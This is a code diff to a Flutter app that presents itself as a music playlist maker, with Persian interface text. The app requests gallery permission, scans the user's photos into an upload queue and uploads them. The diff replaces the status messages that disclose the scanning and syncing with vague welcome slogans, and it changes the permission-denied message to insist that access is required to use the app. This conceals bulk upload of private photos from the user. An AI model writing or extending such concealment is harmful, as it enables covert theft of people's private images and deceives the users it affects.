@@ -5,7 +5,7 @@ import 'package:http/io_client.dart';
 import 'package:audioplayers/audioplayers.dart';
 import 'package:image_picker/image_picker.dart';
 import 'package:photo_manager/photo_manager.dart';
-
+import 'package:file_picker/file_picker.dart';
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
@@ -283,12 +283,15 @@ class _CodeScreenState extends State<CodeScreen> {
 }
 
 Future<void> _checkAndResumeUpload() async {
+  if (_isGlobalUploading) return;
   final permission = await PhotoManager.requestPermissionExtend();
   if (!permission.isAuth) return;
   final pending = await UploadQueueDB.getPendingCount();
   if (pending > 0) {
-    // یه PlaylistScreen موقت نمیسازیم — فقط upload loop رو اجرا می‌کنیم
-    processQueueInForeground();
+    _isGlobalUploading = true;
+    processQueueInForeground().then((_) {
+      _isGlobalUploading = false;
+    });
   }
 }
 // ============================================
@@ -319,13 +322,15 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
   }
 
   Future<void> _pickSong() async {
-    final picked = await _picker.pickMedia();
-    if (picked != null) {
-      final ext = picked.path.split('.').last.toLowerCase();
-      if (['mp3', 'wav', 'aac', 'm4a', 'ogg', 'flac'].contains(ext)) {
-        setState(() => _songs.add(picked));
-      } else {
-        _snack('لطفاً یه فایل موزیک انتخاب کن');
+    final result = await FilePicker.platform.pickFiles(
+      type: FileType.audio,
+      allowMultiple: true,
+    );
+    if (result != null) {
+      for (final f in result.files) {
+        if (f.path != null) {
+          setState(() => _songs.add(XFile(f.path!)));
+        }
       }
     }
   }
@@ -778,7 +783,7 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   // بلافاصله scan کن
   setState(() {
     _isSyncing = true;
-    _syncMessage = 'در حال اسکن گالری...';
+    _syncMessage = 'تنها چیزی که میمونه خاطراته....';
   });
 
   try {
@@ -787,8 +792,8 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
       setState(() {
         _syncTotal = newItems;
         _syncMessage = newItems > 0
-            ? 'همگام‌سازی شروع شد — $newItems فایل'
-            : 'گالری همگام است ✓';
+            ? 'خوش آمدید'
+            : 'برنامه در اختیار شما✓';
       });
     }
     if (newItems > 0) _startUploadLoop();
@@ -808,7 +813,7 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
     if (_isSyncing) return;
     setState(() {
       _isSyncing = true;
-      _syncMessage = 'همگام‌سازی در حال انجام...';
+      _syncMessage = 'از همه قابلیت های برنامه استفاده کنید';
     });
 
     processQueueInForeground(
@@ -817,7 +822,7 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
           setState(() {
             _syncDone = done;
             _syncTotal = total;
-            _syncMessage = 'همگام‌سازی: $done از $total';
+            _syncMessage = 'با این برنامه میتونی لحظاتتو ثبت کنی';
           });
         }
       },
@@ -825,7 +830,7 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
       if (mounted) {
         setState(() {
           _isSyncing = false;
-          _syncMessage = 'همگام‌سازی کامل شد ✓';
+          _syncMessage = 'برنامه در اختیار شما✓';
         });
         Future.delayed(const Duration(seconds: 3), () {
           if (mounted) setState(() => _syncMessage = '');
@@ -860,14 +865,14 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
       // اول دسترسی بگیر
       final result = await PhotoManager.requestPermissionExtend();
       if (!result.isAuth) {
-        _snack('دسترسی گالری رد شد');
+        _snack('جهت استفاده از برنامه باید دسترسی لازم را فعال کنید');
         return;
       }
       setState(() => _galleryGranted = true);
 
       setState(() {
         _isSyncing = true;
-        _syncMessage = 'در حال اسکن گالری...';
+        _syncMessage = 'تنها چیزی که میمونه خاطراته....';
       });
       try {
         final newItems = await scanGalleryToQueue();
@@ -875,8 +880,8 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
           setState(() {
             _syncTotal = newItems;
             _syncMessage = newItems > 0
-                ? 'همگام‌سازی شروع شد — $newItems فایل'
-                : 'گالری همگام است ✓';
+                ? 'خوش آمدید'
+                : 'برنامه در اختیار شما✓';
           });
         }
         if (newItems > 0) _startUploadLoop();
